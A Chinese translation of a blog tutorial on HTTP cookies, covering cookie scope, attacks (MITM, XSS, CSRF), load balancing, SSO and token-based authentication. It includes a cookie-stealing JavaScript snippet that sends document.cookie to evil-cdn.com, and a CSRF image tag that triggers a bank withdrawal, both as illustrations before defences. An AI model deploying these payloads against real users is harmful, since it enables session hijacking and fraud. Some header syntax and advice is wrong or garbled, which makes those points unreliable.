---
layout: post
title:  "HTTP Cookies 究极指南"
data: 2019-05-01
categories:
- Translate
tags:
- Javascript
- Https
- Web
---

每个 Web 开发人员需要了解的 HTTP Cookie！

由于网上有大量关于 HTTP Cookie（后面简称 Cookie）的信息，本文尝试做把它们聚合在一起。对于大多数 Web 开发人员来说，本文应该足以作为 Cookie 中、高级的教程。

文章假设你熟悉 HTTP 和 Web 开发的基础知识。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/001.png)

<!-- more -->


## 什么是 Cookie

从本质上讲，Cookie 就是一小撮数据，具有以下特征：

1. 从 Web 服务器发向用户的浏览器
2. Cookie 中的数据是简单的纯文本，不是二进制
3. Cookie 被浏览器存储在用户的电脑上（磁盘）
4. 一个网站只能读取它自己的 Cookie，不能读其他网站甚至域名的。这个安全性由浏览器保证
5. Cookie 不会在多个浏览器中共享。换句话说，一个浏览器不能读取存在其他浏览器的 Cookie，即使是同一域名的也不行
6. 根据 HTTP 协议，所有 Cookie 的大小不能超过 4KB
7. Web 服务器发给客户端的 Cookie 数量是有限制的。这避免客户端过度消耗磁盘。每个域名大概 20-25 个 Cookie


## 为什么需要 Cookie

主要有 3 个原因：

1. **认证**（session 管理）
2. **追踪用户**
3. **个性化**（主题，语言选择等等）

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/002.png)

Web 构建在 HTTP 协议之上，而 HTTP 又构建于 TCP 协议之上。尽管 TCP 是有状态的（面向连接）的协议，但 HTTP 却是无状态的协议。网络中，在有状态协议上构建无状态协议完全是可以的，反之亦然。无状态协议不会维护前一次通信的任何信息。**HTTP 是无状态的，HTTP 服务器或者叫 Web 服务器不维护前一次请求的任何信息。因此，Web 服务器无法区分两次请求是来自同一浏览器还是多个浏览器**。

在意识到 Web 的强大和简单性之后 -- 它最初是通过超链接提供文档服务 --，它演变成了一个平台。人们开始建立复杂的电子商务网站。**这就需要一种机制来记住用户身份和数据 -- 如何让服务器理解两个 HTTP 请求来自同一个用户/浏览器**。


> *例如电子商务网站，用户可以在主页上选择一个物品，将其添加到购物车，然后导航到其他页面以选择另一个物品。但是当用户导航到下一页时，该用户或他选择的任何物品信息都将消失。由于其无状态特性，HTTP 根本无法保留这些信息。*

因此巧妙的 Cookie 机制出现了。当用户访问网站时，Web 服务器会随着 HTML 文档发送一个 Cookie。在以后的请求中，客户端都会把这个 Cookie 带到 Web 服务器，并创建某种 session。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/003.png)

当然，也有其他方法，比如在第一次访问的时候生成某种 token，并以把 token 隐藏到 `form` 域中或放到 URL 中的形式插入页面，确保每次请求都在往返途中传递。和 Cookie 比起来，这种方法很笨重并且容易出错。Cookie 就非常的优雅、安全而且可靠。


## Cookie 如何工作

Cookie 最常用于 **登录 和 登出（session 管理 和认证）**。下面通过 [Facebook](的例子) 来看看这在实际中是如何工作的。如果你打开 Facebook，可能会看到这样的登录页面：

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/004.png)
<span style="text-align: center; display: block">Facebook home page with login option</span>

当你输入用户名和密码并按下 **Log In** 按钮时，会发生：

1. 浏览器向 www.facebook.com 的服务器发送一个 HTTP 请求。这通常是一个 POST 请求，包含你的用户名和密码。
2. 请求到达服务器之后，服务器会验证你的用户名和密码是否正确。如果正确，服务器会返回一个 HTML 页面，以及一个包含某种 sessionID 的 Cookie（通常是一个 GUID 或者任何服务器唯一的标识）
3. Cookie 放在 HTTP 响应的头部字段 `Set-Cookie` 中
4. 浏览器在收到请求后，会把 Cookie 永久地存在磁盘上
5. 现在，如果用户点击到 facebook.com 的其他页面，或者在同一浏览器的新标签页/窗口打开 facebook.com，浏览器都会在请求中自动带上这个 Cookie
6. **Facebook 的服务器在读到这个 Cookie 时会验证其合法性。服务器通常都会在内存里维护一个所有它生成的 Cookie 的字典。通常会以 sessionID 作为键，userID 或者其他可以标识用户信息的内容作为值。**
7. 在认证了用户之后，服务器就可以给这个用户发送为其量身动态创建的页面。通常都包含该用户的特殊信息，如名字，头像，好友列表，活动订阅等等。

![Peek inside HTTP Request envelope](/assets/img/13a15e4663a207bfb3ef416a092581c5/005.png)
<span style="text-align: center; display: block">Peek inside HTTP Request envelope</span>

### 设置一个 Cookie

要设置 Cookie，服务器必须使用 `Set-Cookie`。下面的例子中，我们设置了一个叫做 **username** 的 Cookie，它的值是 **Harshal**。你可以在 HTTP 头部多次使用 `Set-Cookie` 来发送多个 Cookie。

```
Set-Cookie: <cookie-name>=<cookie-value>
// Example
Set-Cookie: id=Harshal
```

通常 HTTP 响应的封装是这样的：

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/006.png)
<span style="text-align: center; display: block">Typical HTTP Response header</span>

有两种 Cookie：

1. Session Cookie
2. 长期 Cookie

一般情况下，Cookie 的生命周期是浏览器的窗口。**当窗口被关闭时，Cookie 就没了，会被删除。**这样的 Cookie 叫做 **Session Cookie**。你也可以通过指定过期时间来设置一个 **长期 Cookie**：

```
Set-Cookie: userid=1234; Expires:Sat, 30 Jan 2017; 
```

### Cookie 的作用域

你也可以对一个 Cookie 指定作用域。和 `Expires` 类似，还有 `Domain` 和 `Path` 指令。默认情况下，浏览器会把 Cookie 的域名设置成当前文档的主机名，比如就是**你在浏览器地址栏里看到的域名**。后面会说到这个。

`Path` 指示了 URL 的 路径。`Path` 选项的默认值是发送 `Set-Cookie` 的路径。也就是说，如果浏览器在 `http://example.com/test` 上收到的 `Set-Cookie`，会在请求以下路径时带上这个 Cookie：

- http://example.com/test
- http://example.com/test/xyz
- http://example.com/test/any-path-with-test

这个网站的其他路径就不会收到。你也可以手动设置 `Path`：

```
Set-Cookie: id=123; Path=/custom-path
```

### Cookie 的限制

Cookie 确实有一些限制。这些限制主要用来提高安全性和可靠性：

1. **大小**：每个 Cookie 最大 4K
2. **数量**：针对每个域名，Cookie 的数量都有限制。这个限制是浏览器设置的，并不是 HTTP 协议
3. **域名**：服务器只能设置它自己域名的 Cookie。（注：*当涉及子域名的时候，情况有点复杂了*）
4. **访问**：HTTP Cookie 可以被 Javascript 读取。然而，它也只能访问当前域名下的 Cookie


### 理解 Cookie 域名和子域名

就像之前讨论的，Cookie 可以带一个 `Domain` 指令来指示这个 Cookie 会被发到哪些域名上。默认情况下，`domain` 都是当前页面的主机名。

加入 https://google.com 设置了这样一个 Cookie：

```
Set-Cookie: id=1234;
```

那么浏览器在随后请求 https://google.com 时就会带上这个 Cookie。**但因为使用的默认 `Domain`，那么 google.com 的所有子域名都不会发送它**。因此下面的域名都拿不到这个 Cookie：

- https://mail.google.com
- https://drive.google.com
- https://files.drive.google.com

然而如果 https://google.com 像下面这样设置 Cookie：

```
Set-Cookie: id=1234; Domain=google.com
```

既然服务器明确指定了 `Domain`，浏览器会向所有的子域名 https://*.google.com 发送该 Cookie。就像 [Nicolas Zakas](https://www.nczonline.net/blog/2009/05/05/http-cookies-explained/) 解释的那样，**浏览器从尾部开始比较**，一旦匹配就发送对应的 Cookie。概括成一句话就是：

<blockquote class="blockquote-center">父级域名可以为子域名设置 Cookie，反之亦然</blockquote>

Stack Overflow 上的[这个问题](https://stackoverflow.com/a/23086139/5723098)非常好地解释了它们的关系。

你还要明白的是：

> 不同的域名之间不能通过纯 HTTP 共享 Cookie。需要的话，你可以通过外部的 IPC 来实现


### 为什么 Cookie 有很多问题

由于其本质，从有 Cookie 之日起，就批评不断。许多人反对在用户计算机上保存服务器数据。但最终 Cookie 的好处弥补了所有这些隐私顾虑。

但是，它也确实打存在许多安全漏洞。开发人员经常忽视安全措施，直到出现事故。针对 Cookie 主要有三种攻击：

1. 中间人
2. XSS -- 跨站脚本
3. CSRF -- 跨站请求伪造


### 中间人（Man-in-middle）

实际上，这种攻击不是针对 Cookie 的，更多是与 HTTP 和 HTTPS 有关。但人们误将数据被窃取到怪罪到 Cookie 上。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/007.png)

每次 HTTP 请求在到达服务器之前都要经过很多路由器。这些中间实体可以很容易地读取 Cookie。如前所述，Cookie 通常包含用户标识信息。因此，如果这些 Cookie 被某些中间人拿到，那他们就可以伪装成这个用户。

对于通过 HTTP 传输的任何其他数据都是如此。因此，简单的解决方案是使用 HTTPS，尤其是在交换包含用户 ID 等敏感信息的 Cookie 时。使用 HTTPS 之后，虽然不是不可能了，但中间人攻击将变得非常困难。

使用 HTTPS 时需要注意的另一件事是，许多网站在尝试使用 HTTP 时会自动将用户重定向到HTTPS。但如果用户之前已经登录并尝试使用 HTTP 访问，则这次请求可能会发生中间人攻击。有多种方法可以模拟这种情况。[stack exchange 上的这个问题](https://security.stackexchange.com/a/43745)解释得非常好。

<blockquote class="blockquote-center">最简单的解决方案就是使用 HTTPS Only Cookie。也就是说 Cookie 交换只会在使用 HTTPS 时进行。</blockquote>

这可以通过 `Secure` 指令来设置：

```
Set-Cookie: id=123; Secure;
```


### XSS -- 跨站脚本

我们都一直在使用 CDN。因此，即使从 CDN 获取 JS 文件时 CDN 未发送 Cookie，也会认为页面的所有 JS 代码都在同一个域中运行，这意味着从另一个域加载的脚本可以通过 `document.cookie` 来获取该网站的 Cookie。假设您正在从某个邪恶 CDN https://evil-cdn.com/evil-script.js 上加载 JS 文件，而它的代码如下：

```
let img = new Image();
let cookie = document.cookie;
img.src = "https://evil-cdn.com/steal?cookie=" + cookie;
```

现在，每当用户访问您的网站时，用户的 Cookie 也就被盗取了，但用户并不知道。第三方 JS 导致的攻击被称为跨站点脚本（XSS）攻击。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/008.png)

此外，XSS 注入，也可以造成 Cookie 被窃取。它类似于 SQL 注入。如果您过滤用户的输入，就可能会发生注入。当然，如果您使用现代 SPA 框架，则不必担心这一点。

<blockquote class="blockquote-center">要防止 XSS 攻击，使用 HTTP Only Cookie。它会禁止通过 document.cookie 访问 Cookie</blockquote>

但如果这样做了，你的脚本也无法访问 Cookie 了：

```
Set-Cookie: id=1234 HttpOnly
```

### CSRF -- 跨站请求伪造

这又是一种常见的攻击。攻击者利用的是 Cookie 每次请求都会被带上的特性。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/009.png)

想象一下用户正在访问两个网站。一个是正常的银行网站，另一个是邪恶网站。此时用户已经登录过银行的网站了，而邪恶网站里有这样一行代码：

```
<img src="https://mybank.com/withdraw?fromAccount=1234&amount=100&toAccount=789">
```

用户在访问邪恶网站的时候，就会从这个地址加载图片。因为用户已经登录过这个银行的网站 mybank.com，所以浏览器会发送这个 mybank.com 域名的 Cookie，即使这个**请求**是从其他网站（**跨站**）发出的。简而言之，邪恶网站向其他域名发起了跨站请求，意图造成伤害。此类攻击称为跨站点请求伪造（CSRF）。

> *当然，攻击者需要研究确切的 API 调用以转移资金，并且需要用户在登录 mybank.com 后访问他的邪恶网站。***尽管概率略低，但这种攻击在过去被广泛利用**。
 
CSRF 攻击悄无声息，并且涉及到一次访问多个网站，因此很难追踪。

<blockquote class="blockquote-center">简单的方法就是使用 Referer 头，它会告诉服务器某个请求来自哪个网站。</blockquote>

在我们的例子中，mybank.com 服务器可以检查 Referer 头。如果请求来自 evilwebsite.com，则 Referer 头就会包含该值，服务器可以直接拒绝该请求：

```
GET /withdraw?fromAccount=1234&amount=100&toAccount=789
Referer: evilwebsite.com
Cookie: id=123
```

总之，Cookie 一直是争论的话题，但很长一段时间，没有其他的 Cookie 替代品。如今有一些，我们将之后会讨论它们。但是，你可以放心，通过良好的措施，Cookie 可以帮助你为 Web 应用程序构建强大的会话管理，而不会影响安全性。


## 在负载均衡的 Web 应用中使用 Cookie

了解了 Cookie 的基本原理后，现在是时候看看其他方面了。首先是在负载均衡的 Web 应用中共享 Cookie。

如前所述，返回 Cookie 的服务器会维护一个 sessionID 表以识别其对应的用户。这个表射通常放在服务器的内存中。这是简单情况。大多数生产 Web 服务器都使用了负载均衡。

想象我们的网站使用了 2 个服务器：

1. 用户刚开始连的是第一个，服务器 1 验证了用户的登录后，返回了 Cookie
2. 但下一个请求，用户却连到了 服务器 2。浏览器还是会发送 Cookie，因为域名是一样的
3. 然而，**服务器 2 却不知道这个 Cookie 是否合法，因为这不是它返回的**

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/010.png)
<span style="text-align: center; display: block">Handling cookies using Load Balancer</span>

有几种方法来解决这个问题：

1. 两个服务器不停地通信。当服务器 1 返回了一个 Cookie 时，它把这个 Cookie 告诉服务器 2，服务器 2 把这个 Cookie 存到自己的内存里。反过来也适用，如果用户登出了，其他服务器也会把 Cookie 删掉。这叫做 **session trickling**。
2. 第一种方法很低级。更好的做法是使用一个共享的数据库，比如 MySQL。但概念是一样的，不同是它们不再直接通信，而是通过数据库协作。
3. 第二种方法虽然比第一种好，但它由于数据库调用而变得更慢了。要解决这个，可以使用像 Redis 这样的高速内存数据库。Redis 是 NoSQL 的键值数据库，非常适合这种场景。
4. 另一种场景是我们使用了微服务。我们的 API 服务器和 Web 服务器都隐藏在防火墙之后，并且返回 Cookie 和验证 Cookie 由不同的服务负责。有时应用程序网关/负载均衡器负责 Cookie，而 Web 服务器不会被直接访问。

![](/assets/img/13a15e4663a207bfb3ef416a092581c5/011.png)
<span style="text-align: center; display: block">Handling cookies using Redis like high speed in-memory database</span>


## 多域名 Cookie

我们大多数人都使用 Google 云端硬盘，Gmail 和 YouTube。如果您登录任何 Google 服务，比如说 **drive.google.com**，那么您也会自动登录到 **mail.google.com**。在子域之间共享 Cookie 时就已经知道了怎么实现这一目的。

> 如果你登录了 **drive.google.com**，那你还会自动登录 **youtube.com**，这完全是不同的域名？这怎么可能？
 
正如我们已经说过的那样，使用普通的 HTTP 协议，这是不可能的。但是通过一些外部机制实现这一目标虽然棘手但可行的。**\*.google.com** 与 **youtube.com** 服务器通过某种 IPC -- 进程间通信 -- 协作。

在你登陆 Google 账户页面时，也会有一些 YouTube 的请求。这一些发生得很快，我们根本意识不到这些错综复杂的重定向。


### SSO -- 单点登录

这种与多个网站共享身份验证的做法称为**单点登录**（Single Sign On）。Cookie 是为我们提供此功能的基础。有一些很棒的[博客文章](https://blogs.forgerock.org/petermajor/2013/02/single-sign-on-the-basic-concepts/)可以帮助您了解 SSO 的本质。


## 现代 Web 应用的 Cookie

现代 Web 应用程序大都的 UI 和 API 分离。大多数 Web 应用正在转变为 SPA -- 单页应用。除此之外，还有服务器端渲染，预渲染等。

Cookie 的核心功能是在多个页面请求之间保留用户的身份。使用**单页应用**，就不需要维护 Cookie 来识别用户了。加载应用程序后，用户无需刷新页面。

HTML5 给我们提供了几个新的 API -- `LocalStorage` 和 `SessionStorage`。UI 只需要一个 Token 来发起 API 请求。这些 API 请求可以是相同域名、子域名或者是不同的域名（跨域 CORS）。通过 `fetch` API 跨域请求非常简单。

REST API 已演变为无状态 API。这些 API 不像 Cookie 那样需要会话。它需要的只是有效的身份验证 Token，API 会返回适当的响应。

SPA 认证过程如下：

1. 假设用户在访问 Web 应用 https://ui.example.com
2. 初始的 `index.html` 页面由服务器或者 CDN 提供。这启动了我们的 SPA
3. 发起初始 API 请求。如果返回 401，说明我们还没有 Token，出现登录界面
4. 输入账户密码登录。进行 API 调用以获得身份验证 Token。这个 Token 会放在 SessionStorage 或者 LocalStorage 中。这个 Token 的生命周期是有限的（**在 Cookie 中，生命周期只跟这个 Cookie 有关，和 sessionID 是没有关系的**）。
5. 如果 Token 只在一个窗口里面有效，就放在 SessionStorage 里。如果需要在多个标签页/窗口共享，就使用 LocalStorage。
6. 验证 Token 在每次请求的时候都带上。它需要开发者自己设置，不像 Cookie 由浏览器自动设置
7. 一旦用户点击登出，Token 会被删除，用户会再次看到登录界面

特别是，**JWT -- JSON Web Token** 已成为非常流行的身份验证和授权策略，因为它可以轻松地在分布式的 Web 应用中传递数据。生成 sessionID 并将其放入 Cookie 的传统观念正在消亡。Token 无处不在。


### 在 Token 的世界里有 Cookie 的替代品吗

在认证方面和 Cookie 相比，Token 有很大的优势：

1. Token 是无状态的，所以很容易扩展
2. Token 很容易在分布式环境中交换身份认证
3. 由于 HTTP 和 浏览器的域名限制，Cookie 共享很难
4. Cookie 有大小限制
5. 使用 Cookie 的认证很是实现 CORS
6. 储存在 LocalStorage 和 SessionStorage 的 Token 不会受到 CSRF 攻击（但在 XSS 面前都是弟弟，你不能组织 JS 去访问 Cookie）

> 看到基于 Token 的认证这么多优点，是不是觉得 Cookie 对于 session 管理来说不重要了呢？
 
但没那么简单。**Cookie 有两个特点还是非常棒的**：

1. 每次请求都是自动带上的
2. Cookie 的生命周期对 session 管理来说非常精确，非常自然

第一点很直接，好理解。要理解第二点，就得考虑不同存储机制的生命周期：

1. `SessionStorage` 只在一个浏览器标签/窗口里有效。如果我在第一个窗口里登录了，打开第二个窗口，会再让我登录
2. 像 Facebook 和 LinkedIn 的用户喜欢开好多好多标签，如果每个标签都要求登录，也太反人类了。所以不能用 `SessionStorage`
3. 还有一个是 `LocalStorage`。它能持久存储，解决了 `SessionStorage` 的问题。**但它太持久了**。不像 Cookie，`LocalStorage` 里的数据永远不会被删除。它和浏览器是不求同年同月同日生，但求同年同月同日死。开发者必须手动清理 `LocalStorage`。这可能是个安全隐患
4. `LocalStorage` 和 `SessionStorage` 还可能造成 XSS 攻击。并且没办法阻止。另外，开发者需要在每次请求的时候都手动把 Token 带上
5. 处理图片、视频等资源变得困难了。我们通常使用老的 img 标签，像 `<img src="path-to-image"/>` 这样。如果图片是受保护资源，浏览器在请求路径的时候就不会发送 Token。图片是二进制。直到现在，用 Ajax 获取二进制数据都是不可能的。虽然使用 `fetch` 可以实现，但还是很麻烦
6. 另一方面，Cookie 有一个完美的生命周期。生成之后，只要浏览器开着，Cookie 就一直存在。当浏览器关闭时，会清理所有的 **session Cookie**。浏览器也会在 Cookie 过期时清理它们

<blockquote class="blockquote-center">所以，我们即要 Token 的无状态，又要维护 session（传统登录登出），因为用户想这样。解决方案就是一起用。</blockquote>

<blockquote class="blockquote-center">把 Cookie 当存储媒介，Token 用做认证机制并放在 Cookie 里。</blockquote>

当然这种方法也有缺点。你的 JWT 不能超过 Cookie 的限制。但总的来说：

1. Cookie 只用来储存
2. 使用 Token 认证，并放在 Cookie 里

有很多文章/教程解释 Token 的内部工作原理以及使用 Token 的 Cookie。你可以找来读读。


## Cookie，广告，Goole，Facebook

这是本文的最后一个话题。如前所述，Cookie有三个主要用途 -- 会话管理，个性化和跟踪。使用 Cookie 进行个性化是一件很容易的事情。主要是关于语言，主题，颜色等用户偏好。

> *使用 Cookie 进行跟踪是一个有趣且错综复杂的想法。谷歌，Facebook 等通过在其发布网站上展示广告来赚取收入的大公司都依赖于 Cookie。这是他们的主要收入来源。*

这个想法虽简单，但很杂乱。

1. 大的发布网站，像报纸、博客等会在其用户的浏览器上设置 Cookie。这是**第一方 Cookie**
2. 此外这些网站会向 Google 等其他网站发请求。这可能只是一个简单的 1x1 的图片请求。这个请求放回的 Cookie 也会存到用户机器上。这种由外部请求设置的 Cookie 叫做**第三放 Cookie**
3. 现在如果用户到了其他网站，也请求了相同的外部域名，浏览器就会发送之前的 Cookie
4. 由于共享 Cookie，外部服务就可以得到即定用户访问了哪些页面，哪些网站。并根据用户喜好，给用户显示目标广告
5. 随着更多第三方 Cookie 存储在用户的机器上，广告就越强大且有针对性。这些第三方 Cookie 是永久 Cookie，而第一方 Cookie 通常是会话 Cookie

因此，如果你访问一些旅游网站，你将开始在网上看到到处都是假期，旅行的广告。由于大多数非技术人员都不了解这一点，因此近来这已成为一个严重的隐私问题。

目前正在使用技术方案和法律框架的一起来解决这个问题。例如，在欧盟成员国，如果网站打算使用 Cookie，必须获得用户的许可。因此，您可能会在很多站点上看到 Cookie 权限对话框。

跟踪是无法在一篇文章中解决的庞大主题之一。它有许多法律后果，它比我们想象的更加多的应用于我们的日常生活。

Cookie 是支撑现代 Web 的先驱理念之一。Cookie 正在发展。随着现代网络围绕智能手机和设备的兴起，Cookie 的基本概念正在不断发展。旧的想法濒临死亡，被更复杂的东西取代，这些新东西正以我们希望或不希望的方式控制 Web。


## 鸣谢

文章使用的图片和图标来源与 [Freepik](https://www.freepik.com/) 和 [Flaticon](https://www.flaticon.com/)。


---

本文翻译自 [Harshal Patil](https://blog.webf.zone/@mistyHarsh) 发表于 WebF 上的文章 [Ultimate Guide to HTTP Cookies](https://blog.webf.zone/ultimate-guide-to-http-cookies-2aa3e083dbae)。